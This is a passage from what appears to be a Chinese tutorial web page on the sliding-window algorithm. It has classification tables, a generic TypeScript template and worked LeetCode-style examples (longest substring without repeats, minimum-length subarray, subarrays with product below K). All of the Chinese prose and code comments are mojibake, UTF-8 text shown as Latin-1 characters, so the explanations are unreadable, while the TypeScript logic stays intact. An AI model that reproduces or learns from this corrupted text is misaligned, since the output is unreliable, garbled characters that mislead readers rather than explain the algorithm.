<p><strong>è§„å¾‹2ï¼ˆå¥½çŠ¶æ€çš„è¢«åŒ…å«æ€§ï¼‰</strong>ï¼šè‹¥çª—å£ [left, right] å¤„äºâ€œå¥½çŠ¶æ€â€ï¼ˆå¦‚æ— é‡å¤ã€å’Œ&lt;targetã€ç§¯&lt;Kï¼‰ï¼Œåˆ™æ‰€æœ‰è¢«è¯¥çª—å£åŒ…å«çš„æ›´å°çª—å£ [left+1, right]ã€[left+2, right]... å¿…ç„¶ä¹Ÿæ˜¯â€œå¥½çŠ¶æ€â€ã€‚æ­¤æ—¶æ— éœ€ç¼©å°çª—å£ï¼Œåº”ç»§ç»­æ‰©å±• right å¯»æ‰¾æ›´ä¼˜è§£ã€‚</p>
</li>
</ul>
<h3 data-id="heading-4">1.3 ä¸€å¥è¯æ€»ç»“åŸç†</h3>
<p>æ»‘åŠ¨çª—å£é€šè¿‡ right æŒ‡é’ˆâ€œæ‰©çª—å£â€æ¢ç´¢æ–°çš„åŒºé—´ï¼Œé€šè¿‡ left æŒ‡é’ˆâ€œç¼©çª—å£â€å‰”é™¤æ— æ•ˆåŒºé—´ï¼Œæ¯ä¸ªå…ƒç´ æœ€å¤šè¢«åŠ å…¥çª—å£ï¼ˆright ç§»åŠ¨ï¼‰å’Œç§»å‡ºçª—å£ï¼ˆleft ç§»åŠ¨ï¼‰å„ä¸€æ¬¡ï¼Œæœ€ç»ˆä»¥ O(n) æ—¶é—´å®Œæˆæ‰€æœ‰æœ‰æ•ˆåŒºé—´çš„æšä¸¾ã€‚</p>
<h2 data-id="heading-5">äºŒã€æ»‘åŠ¨çª—å£çš„åˆ†ç±»ï¼šæŒ‰ç›®æ ‡åœºæ™¯åˆ’åˆ†</h2>
<p>æ»‘åŠ¨çª—å£çš„æ ¸å¿ƒé€»è¾‘ä¸€è‡´ï¼Œä½†æ ¹æ®é—®é¢˜ç›®æ ‡ï¼ˆæ±‚æœ€é•¿ã€æ±‚æœ€çŸ­ã€æ±‚è®¡æ•°ï¼‰çš„ä¸åŒï¼Œç¼©çª—å£çš„æ¡ä»¶å’Œæ›´æ–°ç­”æ¡ˆçš„æ—¶æœºä¼šæœ‰å·®å¼‚ã€‚æŒ‰ç›®æ ‡å¯åˆ†ä¸ºä¸‰å¤§ç±»ï¼Œè¦†ç›–ç»å¤§å¤šæ•°ç»å…¸åœºæ™¯ï¼š</p>

































<table><thead><tr><th>åˆ†ç±»</th><th>æ ¸å¿ƒç›®æ ‡</th><th>ç¼©çª—å£æ¡ä»¶</th><th>æ›´æ–°ç­”æ¡ˆæ—¶æœº</th><th>å…¸å‹é—®é¢˜</th></tr></thead><tbody><tr><td>ç±»å‹1ï¼šæ±‚æœ€é•¿/æœ€å¤§åŒºé—´</td><td>æ‰¾åˆ°æ»¡è¶³â€œå¥½çŠ¶æ€â€çš„æœ€é•¿è¿ç»­åŒºé—´</td><td>çª—å£è¿›å…¥â€œåçŠ¶æ€â€æ—¶ï¼Œç¼© left è‡³å›åˆ°â€œå¥½çŠ¶æ€â€</td><td>ç¼©çª—å£å®Œæˆåï¼Œæ¯æ¬¡æ‰©å±• right åæ›´æ–°</td><td>æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²ã€æœ€é•¿é‡å¤å­æ•°ç»„</td></tr><tr><td>ç±»å‹2ï¼šæ±‚æœ€çŸ­/æœ€å°åŒºé—´</td><td>æ‰¾åˆ°æ»¡è¶³â€œå¥½çŠ¶æ€â€çš„æœ€çŸ­è¿ç»­åŒºé—´</td><td>çª—å£è¿›å…¥â€œå¥½çŠ¶æ€â€æ—¶ï¼Œç¼© left è‡³å›åˆ°â€œåçŠ¶æ€â€ï¼ˆå°½å¯èƒ½ç¼©å°çª—å£ï¼‰</td><td>ç¼©çª—å£è¿‡ç¨‹ä¸­ï¼Œæ¯æ¬¡ç¼©å° left åæ›´æ–°</td><td>é•¿åº¦æœ€å°çš„å­æ•°ç»„ã€æœ€å°è¦†ç›–å­ä¸²</td></tr><tr><td>ç±»å‹3ï¼šæ±‚è®¡æ•°/ç»Ÿè®¡åŒºé—´</td><td>ç»Ÿè®¡æ‰€æœ‰æ»¡è¶³â€œå¥½çŠ¶æ€â€çš„è¿ç»­åŒºé—´ä¸ªæ•°</td><td>çª—å£è¿›å…¥â€œåçŠ¶æ€â€æ—¶ï¼Œç¼© left è‡³å›åˆ°â€œå¥½çŠ¶æ€â€</td><td>ç¼©çª—å£å®Œæˆåï¼Œç´¯åŠ å½“å‰ right å¯¹åº”çš„æœ‰æ•ˆåŒºé—´æ•°ï¼ˆright-left+1ï¼‰</td><td>ä¹˜ç§¯å°äº K çš„å­æ•°ç»„ã€æ‰¾åˆ°å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å­—æ¯å¼‚ä½è¯</td></tr></tbody></table>
<h2 data-id="heading-6">ä¸‰ã€é€‚ç”¨åœºæ™¯ï¼š3ä¸ªæ ¸å¿ƒåˆ¤æ–­æ ‡å‡†</h2>
<p>å¹¶éæ‰€æœ‰å­ä¸²/å­æ•°ç»„é—®é¢˜éƒ½èƒ½ç”¨æ»‘åŠ¨çª—å£ï¼Œéœ€æ»¡è¶³ä»¥ä¸‹ 3 ä¸ªæ ¸å¿ƒæ¡ä»¶ï¼Œç¼ºä¸€ä¸å¯ï¼š</p>
<ol>
<li>
<p><strong>é—®é¢˜å¯¹è±¡æ˜¯è¿ç»­åŒºé—´</strong>ï¼šæ»‘åŠ¨çª—å£ä»…é€‚ç”¨äºâ€œè¿ç»­å­ä¸²â€æˆ–â€œè¿ç»­å­æ•°ç»„â€é—®é¢˜ï¼Œéè¿ç»­åŒºé—´ï¼ˆå¦‚å­åºåˆ—ï¼‰ä¸é€‚ç”¨ã€‚</p>
</li>
<li>
<p><strong>çª—å£çŠ¶æ€å…·æœ‰å•è°ƒæ€§</strong>ï¼šéœ€æ»¡è¶³å‰æ–‡æåˆ°çš„ä¸¤æ¡è§„å¾‹ä¹‹ä¸€ï¼Œå³æ‰©å±•/ç¼©å°çª—å£æ—¶ï¼ŒçŠ¶æ€å˜åŒ–æ˜¯å•å‘çš„ã€‚åä¾‹ï¼šâ€œæ‰¾å’Œä¸º target çš„å­æ•°ç»„ï¼ˆå«è´Ÿæ•°å€¼ï¼‰â€ï¼Œçª—å£ [left, right] å’Œä¸º target æ—¶ï¼Œæ‰©å±• right å¯èƒ½å› è´Ÿæ•°å¯¼è‡´å’Œå˜å°ï¼Œæ‰“ç ´å•è°ƒæ€§ï¼Œæ— æ³•ç”¨æ»‘åŠ¨çª—å£ã€‚</p>
</li>
<li>
<p><strong>çŠ¶æ€å¯å¿«é€Ÿæ›´æ–°</strong>ï¼šåŠ å…¥ right å…ƒç´ æˆ–ç§»å‡º left å…ƒç´ æ—¶ï¼Œçª—å£çš„çŠ¶æ€ï¼ˆå¦‚å’Œã€ç§¯ã€å­—ç¬¦é¢‘ç‡ï¼‰èƒ½åœ¨ O(1) æ—¶é—´å†…æ›´æ–°ï¼Œæ— éœ€é‡æ–°è®¡ç®—æ•´ä¸ªçª—å£çŠ¶æ€ã€‚</p>
</li>
</ol>
<h2 data-id="heading-7">å››ã€é€šç”¨æ¨¡æ¿ï¼š3ç±»åœºæ™¯ç»Ÿä¸€æ¡†æ¶</h2>
<p>åŸºäºä¸Šè¿°åˆ†ç±»ï¼Œæç‚¼å‡ºé€šç”¨æ¨¡æ¿ï¼Œåªéœ€æ ¹æ®ç›®æ ‡è°ƒæ•´ã€Œç¼©çª—å£æ¡ä»¶ã€å’Œã€Œæ›´æ–°ç­”æ¡ˆæ—¶æœºã€å³å¯ã€‚æ¨¡æ¿æ ¸å¿ƒæ­¥éª¤ï¼šåˆå§‹åŒ–å˜é‡ â†’ æ‰©çª—å£ â†’ ç¼©çª—å£ â†’ æ›´æ–°ç­”æ¡ˆã€‚</p>
<h3 data-id="heading-8">4.0 å¿«é€Ÿå‚è€ƒè¡¨</h3>

































<table><thead><tr><th>ç±»å‹</th><th>åˆå§‹ ans</th><th>ç¼©çª—å£æ¡ä»¶</th><th>æ›´æ–°ç­”æ¡ˆæ—¶æœº</th><th>å…³é”®ä»£ç </th></tr></thead><tbody><tr><td><strong>ç±»å‹1ï¼šæ±‚æœ€é•¿</strong></td><td><code>0</code></td><td>è¿›å…¥åçŠ¶æ€</td><td>ç¼©çª—å£åï¼Œæ¯æ¬¡æ‰©å±• right å</td><td><code>ans = Math.max(ans, right - left + 1)</code></td></tr><tr><td><strong>ç±»å‹2ï¼šæ±‚æœ€çŸ­</strong></td><td><code>Infinity</code></td><td>è¿›å…¥å¥½çŠ¶æ€</td><td>ç¼©çª—å£è¿‡ç¨‹ä¸­</td><td><code>ans = Math.min(ans, right - left + 1)</code></td></tr><tr><td><strong>ç±»å‹3ï¼šæ±‚è®¡æ•°</strong></td><td><code>0</code></td><td>è¿›å…¥åçŠ¶æ€</td><td>ç¼©çª—å£å</td><td><code>ans += right - left + 1</code></td></tr></tbody></table>
<h3 data-id="heading-9">4.1 é€šç”¨æ¨¡æ¿ï¼ˆTypeScript/JavaScriptï¼‰</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> slidingWindowTemplate&lt;T&gt;(<span class="hljs-attr">data</span>: T[], <span class="hljs-attr">targetParam</span>: <span class="hljs-built_in">any</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-comment">// 1. åˆå§‹åŒ–å˜é‡</span>
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>; <span class="hljs-comment">// å·¦çª—å£è¾¹ç•Œ</span>
  <span class="hljs-keyword">let</span> ans = åˆå§‹å€¼; <span class="hljs-comment">// ç­”æ¡ˆå˜é‡ï¼ˆæœ€é•¿â†’0ï¼Œæœ€çŸ­â†’Infinityï¼Œè®¡æ•°â†’0ï¼‰</span>
  <span class="hljs-keyword">let</span> status = åˆå§‹çŠ¶æ€; <span class="hljs-comment">// å¦‚å¯¹è±¡ï¼ˆå­—ç¬¦é¢‘ç‡ï¼‰ã€sum=0ã€prod=1</span>

  <span class="hljs-comment">// 2. æ‰©çª—å£ï¼šright éå†æ‰€æœ‰å…ƒç´ </span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; data.<span class="hljs-property">length</span>; right++) {
    <span class="hljs-keyword">const</span> rightVal = data[right];
    <span class="hljs-comment">// åŠ å…¥å³å…ƒç´ ï¼Œæ›´æ–°çŠ¶æ€</span>
    <span class="hljs-comment">// status.update(rightVal); // æ ¹æ®å…·ä½“ç±»å‹æ›´æ–°</span>

    <span class="hljs-comment">// 3. ç¼©çª—å£ï¼šæ ¹æ®ç›®æ ‡å’Œå½“å‰çŠ¶æ€åˆ¤æ–­æ˜¯å¦ç¼©å·¦</span>
    <span class="hljs-keyword">while</span> (ç¼©çª—å£æ¡ä»¶) {
      <span class="hljs-comment">// æ ¸å¿ƒå·®å¼‚ç‚¹ï¼šä¸åŒç±»å‹åœºæ™¯æ¡ä»¶ä¸åŒ</span>
      <span class="hljs-keyword">const</span> leftVal = data[left];
      <span class="hljs-comment">// ç§»å‡ºå·¦å…ƒç´ ï¼Œæ›´æ–°çŠ¶æ€</span>
      <span class="hljs-comment">// status.remove(leftVal); // æ ¹æ®å…·ä½“ç±»å‹æ›´æ–°</span>
      left++; <span class="hljs-comment">// ç¼©å°çª—å£</span>
    }

    <span class="hljs-comment">// 4. æ›´æ–°ç­”æ¡ˆï¼šæ ¹æ®ç±»å‹è°ƒæ•´æ—¶æœº</span>
    <span class="hljs-comment">// ç­”æ¡ˆæ›´æ–°é€»è¾‘</span>
    <span class="hljs-comment">// æ ¸å¿ƒå·®å¼‚ç‚¹ï¼šä¸åŒç±»å‹åœºæ™¯æ—¶æœºä¸åŒ</span>
  }

  <span class="hljs-comment">// 5. å¤„ç†è¾¹ç•Œæƒ…å†µï¼ˆå¦‚æ— æ»¡è¶³æ¡ä»¶çš„çª—å£ï¼‰</span>
  <span class="hljs-keyword">return</span> å¤„ç†åçš„ ans;
}
</code></pre>
<h3 data-id="heading-10">4.2 åˆ†ç±»å‹æ¨¡æ¿ç»†åŒ–</h3>
<h4 data-id="heading-11">ç±»å‹1ï¼šæ±‚æœ€é•¿/æœ€å¤§åŒºé—´</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> maxLengthTemplate&lt;T&gt;(<span class="hljs-attr">data</span>: T[], <span class="hljs-attr">param</span>: <span class="hljs-built_in">any</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> ans = <span class="hljs-number">0</span>; <span class="hljs-comment">// æœ€é•¿åˆå§‹ä¸º0</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">status</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>&gt; = {}; <span class="hljs-comment">// å¯¹è±¡ï¼šè®°å½•å­—ç¬¦é¢‘ç‡</span>

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; data.<span class="hljs-property">length</span>; right++) {
    <span class="hljs-keyword">const</span> rightVal = data[right];
    <span class="hljs-comment">// æ›´æ–°çŠ¶æ€</span>
    status[rightVal <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>] = status[rightVal <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>] ? status[rightVal <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>] + <span class="hljs-number">1</span> : <span class="hljs-number">1</span>;

    <span class="hljs-comment">// ç¼©çª—å£æ¡ä»¶ï¼šè¿›å…¥åçŠ¶æ€</span>
    <span class="hljs-keyword">while</span> (åçŠ¶æ€åˆ¤æ–­) {
      <span class="hljs-comment">// å¦‚ status[rightVal] &gt; 1ï¼ˆé‡å¤å­—ç¬¦ï¼‰</span>
      <span class="hljs-keyword">const</span> leftVal = data[left];
      status[leftVal <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>]--;
      left++;
    }

    <span class="hljs-comment">// æ›´æ–°ç­”æ¡ˆï¼šç¼©çª—å£åï¼Œå½“å‰çª—å£æ˜¯æœ‰æ•ˆæœ€é•¿çª—å£</span>
    ans = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(ans, right - left + <span class="hljs-number">1</span>);
  }

  <span class="hljs-keyword">return</span> ans;
}
</code></pre>
<h4 data-id="heading-12">ç±»å‹2ï¼šæ±‚æœ€çŸ­/æœ€å°åŒºé—´</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">minLengthTemplate</span>(<span class="hljs-params">data: <span class="hljs-built_in">number</span>[], param: <span class="hljs-built_in">any</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> ans = <span class="hljs-title class_">Infinity</span>; <span class="hljs-comment">// æœ€çŸ­åˆå§‹ä¸ºæ— ç©·å¤§</span>
  <span class="hljs-keyword">let</span> status = <span class="hljs-number">0</span>; <span class="hljs-comment">// å¦‚ sumWindow = 0</span>

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; data.<span class="hljs-property">length</span>; right++) {
    <span class="hljs-keyword">const</span> rightVal = data[right];
    status += rightVal; <span class="hljs-comment">// æ›´æ–°çŠ¶æ€</span>

    <span class="hljs-comment">// ç¼©çª—å£æ¡ä»¶ï¼šè¿›å…¥å¥½çŠ¶æ€ï¼ˆå°½å¯èƒ½ç¼©å°çª—å£ï¼‰</span>
    <span class="hljs-keyword">while</span> (å¥½çŠ¶æ€åˆ¤æ–­) {
      <span class="hljs-comment">// å¦‚ status &gt;= targetï¼ˆå’Œâ‰¥ç›®æ ‡ï¼‰</span>
      <span class="hljs-comment">// ç¼©çª—å£æ—¶æ›´æ–°ç­”æ¡ˆ</span>
      ans = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(ans, right - left + <span class="hljs-number">1</span>);
      <span class="hljs-keyword">const</span> leftVal = data[left];
      status -= leftVal;
      left++;
    }
  }

  <span class="hljs-comment">// å¤„ç†è¾¹ç•Œï¼šæ— æ»¡è¶³æ¡ä»¶çš„çª—å£è¿”å›0</span>
  <span class="hljs-keyword">return</span> ans !== <span class="hljs-title class_">Infinity</span> ? ans : <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-13">ç±»å‹3ï¼šæ±‚è®¡æ•°/ç»Ÿè®¡åŒºé—´</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">countTemplate</span>(<span class="hljs-params">data: <span class="hljs-built_in">number</span>[], param: <span class="hljs-built_in">any</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> ans = <span class="hljs-number">0</span>; <span class="hljs-comment">// è®¡æ•°åˆå§‹ä¸º0</span>
  <span class="hljs-keyword">let</span> status = <span class="hljs-number">1</span>; <span class="hljs-comment">// å¦‚ prod = 1</span>

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; data.<span class="hljs-property">length</span>; right++) {
    <span class="hljs-keyword">const</span> rightVal = data[right];
    status *= rightVal; <span class="hljs-comment">// æ›´æ–°çŠ¶æ€</span>

    <span class="hljs-comment">// ç¼©çª—å£æ¡ä»¶ï¼šè¿›å…¥åçŠ¶æ€</span>
    <span class="hljs-keyword">while</span> (åçŠ¶æ€åˆ¤æ–­) {
      <span class="hljs-comment">// å¦‚ status &gt;= Kï¼ˆä¹˜ç§¯â‰¥Kï¼‰</span>
      <span class="hljs-keyword">const</span> leftVal = data[left];
      status /= leftVal;
      left++;
    }

    <span class="hljs-comment">// æ›´æ–°ç­”æ¡ˆï¼šå½“å‰rightå¯¹åº”çš„æœ‰æ•ˆåŒºé—´æ•° = right-left+1</span>
    ans += right - left + <span class="hljs-number">1</span>;
  }

  <span class="hljs-keyword">return</span> ans;
}
</code></pre>
<h2 data-id="heading-14">äº”ã€ç»å…¸ä¾‹é¢˜å®æˆ˜ï¼šé€è¡Œæ‹†è§£</h2>
<p>ç»“åˆæ¨¡æ¿ï¼Œæ‹†è§£ 3 ç±»åœºæ™¯çš„ç»å…¸ä¾‹é¢˜ï¼Œå¸®ä½ ç†è§£å¦‚ä½•å°†æ¨¡æ¿è½åœ°åˆ°å…·ä½“é—®é¢˜ã€‚</p>
<h3 data-id="heading-15">ä¾‹é¢˜1ï¼šæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²ï¼ˆç±»å‹1ï¼šæ±‚æœ€é•¿ï¼‰</h3>
<h4 data-id="heading-16">é¢˜ç›®æè¿°</h4>
<p>ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸² sï¼Œè¯·ä½ æ‰¾å‡ºå…¶ä¸­ä¸å«æœ‰é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²çš„é•¿åº¦ã€‚</p>
<h4 data-id="heading-17">è§£é¢˜æ€è·¯</h4>
<ul>
<li><strong>çª—å£çŠ¶æ€ï¼ˆåï¼‰</strong>ï¼šçª—å£å†…å­˜åœ¨é‡å¤å­—ç¬¦ï¼›</li>
<li><strong>çŠ¶æ€ç»Ÿè®¡</strong>ï¼šç”¨å¯¹è±¡è®°å½•çª—å£å†…å­—ç¬¦çš„å‡ºç°æ¬¡æ•°ï¼›</li>
<li><strong>ç¼©çª—å£æ¡ä»¶</strong>ï¼šå½“å‰åŠ å…¥çš„å­—ç¬¦å‡ºç°æ¬¡æ•°&gt;1ï¼ˆè¿›å…¥åçŠ¶æ€ï¼‰ï¼›</li>
<li><strong>æ›´æ–°ç­”æ¡ˆ</strong>ï¼šç¼©çª—å£å®Œæˆåï¼Œè®¡ç®—å½“å‰çª—å£é•¿åº¦ï¼Œæ›´æ–°æœ€å¤§å€¼ã€‚</li>
</ul>
<h4 data-id="heading-18">ä»£ç å®ç°</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">lengthOfLongestSubstring</span>(<span class="hljs-params">s: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> ans = <span class="hljs-number">0</span>; <span class="hljs-comment">// æœ€é•¿å­ä¸²é•¿åº¦åˆå§‹ä¸º0</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">window</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>&gt; = {}; <span class="hljs-comment">// å¯¹è±¡ï¼šè®°å½•çª—å£å†…å­—ç¬¦å‡ºç°æ¬¡æ•°</span>

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; s.<span class="hljs-property">length</span>; right++) {
    <span class="hljs-keyword">const</span> rightChar = s[right];
    <span class="hljs-comment">// åŠ å…¥å³å­—ç¬¦ï¼Œæ›´æ–°çŠ¶æ€</span>
    <span class="hljs-variable language_">window</span>[rightChar] = <span class="hljs-variable language_">window</span>[rightChar] ? <span class="hljs-variable language_">window</span>[rightChar] + <span class="hljs-number">1</span> : <span class="hljs-number">1</span>;

    <span class="hljs-comment">// ç¼©çª—å£ï¼šå½“å½“å‰å­—ç¬¦å‡ºç°æ¬¡æ•°&gt;1ï¼ˆåçŠ¶æ€ï¼‰ï¼Œç¼©å·¦ç›´åˆ°æ— é‡å¤</span>
    <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">window</span>[rightChar] &gt; <span class="hljs-number">1</span>) {
      <span class="hljs-keyword">const</span> leftChar = s[left];
      <span class="hljs-variable language_">window</span>[leftChar]--; <span class="hljs-comment">// ç§»å‡ºå·¦å­—ç¬¦ï¼Œæ›´æ–°çŠ¶æ€</span>
      left++;
    }

    <span class="hljs-comment">// æ›´æ–°ç­”æ¡ˆï¼šå½“å‰çª—å£æ˜¯æ— é‡å¤çš„æœ‰æ•ˆçª—å£ï¼Œè®¡ç®—é•¿åº¦</span>
    ans = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(ans, right - left + <span class="hljs-number">1</span>);
  }

  <span class="hljs-keyword">return</span> ans;
}
</code></pre>
<h4 data-id="heading-19">å¤æ‚åº¦åˆ†æ</h4>
<p>æ—¶é—´å¤æ‚åº¦ O(n)ï¼šæ¯ä¸ªå­—ç¬¦è¢« right åŠ å…¥ã€left ç§»å‡ºå„ä¸€æ¬¡ï¼›ç©ºé—´å¤æ‚åº¦ O(min(m, n)))ï¼šm æ˜¯å­—ç¬¦é›†å¤§å°ï¼Œçª—å£å†…å­—ç¬¦æ•°ä¸è¶…è¿‡ min(m, n)ã€‚</p>
<h3 data-id="heading-20">ä¾‹é¢˜2ï¼šé•¿åº¦æœ€å°çš„å­æ•°ç»„ï¼ˆç±»å‹2ï¼šæ±‚æœ€çŸ­ï¼‰</h3>
<h4 data-id="heading-21">é¢˜ç›®æè¿°</h4>
<p>ç»™å®šä¸€ä¸ªå«æœ‰ n ä¸ªæ­£æ•´æ•°çš„æ•°ç»„å’Œä¸€ä¸ªæ­£æ•´æ•° targetï¼Œæ‰¾å‡ºè¯¥æ•°ç»„ä¸­æ»¡è¶³å…¶å’Œ â‰¥ target çš„é•¿åº¦æœ€å°çš„ è¿ç»­å­æ•°ç»„ï¼Œå¹¶è¿”å›å…¶é•¿åº¦ã€‚å¦‚æœä¸å­˜åœ¨ç¬¦åˆæ¡ä»¶çš„å­æ•°ç»„ï¼Œè¿”å› 0ã€‚</p>
<h4 data-id="heading-22">è§£é¢˜æ€è·¯</h4>
<ul>
<li><strong>çª—å£çŠ¶æ€ï¼ˆå¥½ï¼‰</strong>ï¼šçª—å£å’Œâ‰¥targetï¼›</li>
<li><strong>çŠ¶æ€ç»Ÿè®¡</strong>ï¼šç”¨ sumWindow è®°å½•çª—å£å†…å…ƒç´ å’Œï¼›</li>
<li><strong>ç¼©çª—å£æ¡ä»¶</strong>ï¼šsumWindowâ‰¥targetï¼ˆè¿›å…¥å¥½çŠ¶æ€ï¼‰ï¼Œç¼©å·¦ä»¥å¯»æ‰¾æ›´çŸ­çª—å£ï¼›</li>
<li><strong>æ›´æ–°ç­”æ¡ˆ</strong>ï¼šç¼©çª—å£è¿‡ç¨‹ä¸­ï¼Œæ¯æ¬¡ç¼©å°åè®¡ç®—çª—å£é•¿åº¦ï¼Œæ›´æ–°æœ€å°å€¼ã€‚</li>
</ul>
<h4 data-id="heading-23">ä»£ç å®ç°</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">minSubArrayLen</span>(<span class="hljs-params">target: <span class="hljs-built_in">number</span>, nums: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> ans = <span class="hljs-title class_">Infinity</span>; <span class="hljs-comment">// æœ€çŸ­é•¿åº¦åˆå§‹ä¸ºæ— ç©·å¤§</span>
  <span class="hljs-keyword">let</span> sumWindow = <span class="hljs-number">0</span>; <span class="hljs-comment">// çª—å£å†…å…ƒç´ å’Œ</span>

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; nums.<span class="hljs-property">length</span>; right++) {
    sumWindow += nums[right]; <span class="hljs-comment">// åŠ å…¥å³å…ƒç´ ï¼Œæ›´æ–°å’Œ</span>

    <span class="hljs-comment">// ç¼©çª—å£ï¼šå’Œâ‰¥targetæ—¶ï¼Œå°½å¯èƒ½ç¼©å°çª—å£</span>
    <span class="hljs-keyword">while</span> (sumWindow &gt;= target) {
      <span class="hljs-comment">// ç¼©çª—å£æ—¶æ›´æ–°ç­”æ¡ˆï¼šå½“å‰çª—å£æ˜¯æœ‰æ•ˆæœ€çŸ­çª—å£å€™é€‰</span>
      ans = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(ans, right - left + <span class="hljs-number">1</span>);
      sumWindow -= nums[left]; <span class="hljs-comment">// ç§»å‡ºå·¦å…ƒç´ ï¼Œæ›´æ–°å’Œ</span>
      left++;
    }
  }

  <span class="hljs-comment">// å¤„ç†è¾¹ç•Œï¼šæ— æ»¡è¶³æ¡ä»¶çš„çª—å£è¿”å›0</span>
  <span class="hljs-keyword">return</span> ans !== <span class="hljs-title class_">Infinity</span> ? ans : <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-24">å¤æ‚åº¦åˆ†æ</h4>
<p>æ—¶é—´å¤æ‚åº¦ O(n)ï¼šæ¯ä¸ªå…ƒç´ æœ€å¤šè¢«éå†ä¸¤æ¬¡ï¼›ç©ºé—´å¤æ‚åº¦ O(1)ï¼šä»…ç”¨å¸¸æ•°çº§å˜é‡ã€‚</p>
<h3 data-id="heading-25">ä¾‹é¢˜3ï¼šä¹˜ç§¯å°äº K çš„å­æ•°ç»„ï¼ˆç±»å‹3ï¼šæ±‚è®¡æ•°ï¼‰</h3>
<h4 data-id="heading-26">é¢˜ç›®æè¿°</h4>
<p>ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªæ•´æ•° kï¼Œç»Ÿè®¡å¹¶è¿”å›è¯¥æ•°ç»„ä¸­ä¹˜ç§¯å°äº k çš„è¿ç»­å­æ•°ç»„çš„ä¸ªæ•°ã€‚</p>
<h4 data-id="heading-27">è§£é¢˜æ€è·¯</h4>
<ul>
<li><strong>çª—å£çŠ¶æ€ï¼ˆåï¼‰</strong>ï¼šçª—å£ä¹˜ç§¯â‰¥kï¼›</li>
<li><strong>çŠ¶æ€ç»Ÿè®¡</strong>ï¼šç”¨ prod è®°å½•çª—å£å†…å…ƒç´ ä¹˜ç§¯ï¼›</li>
<li><strong>ç¼©çª—å£æ¡ä»¶</strong>ï¼šprodâ‰¥kï¼ˆè¿›å…¥åçŠ¶æ€ï¼‰ï¼Œç¼©å·¦ç›´åˆ°ä¹˜ç§¯&lt;kï¼›</li>
<li><strong>æ›´æ–°ç­”æ¡ˆ</strong>ï¼šç¼©çª—å£å®Œæˆåï¼Œå½“å‰ right å¯¹åº”çš„æœ‰æ•ˆå­æ•°ç»„æ•°ä¸º right-left+1ï¼ˆå³ [left,right]ã€[left+1,right]...[right,right]ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-28">ä»£ç å®ç°</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">numSubarrayProductLessThanK</span>(<span class="hljs-params">nums: <span class="hljs-built_in">number</span>[], k: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-comment">// è¾¹ç•Œæ¡ä»¶ï¼škâ‰¤1æ—¶ï¼Œæ‰€æœ‰æ­£æ•´æ•°ä¹˜ç§¯â‰¥1ï¼Œæ— æ»¡è¶³æ¡ä»¶çš„å­æ•°ç»„</span>
  <span class="hljs-keyword">if</span> (k &lt;= <span class="hljs-number">1</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
  }
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> ans = <span class="hljs-number">0</span>; <span class="hljs-comment">// è®¡æ•°åˆå§‹ä¸º0</span>
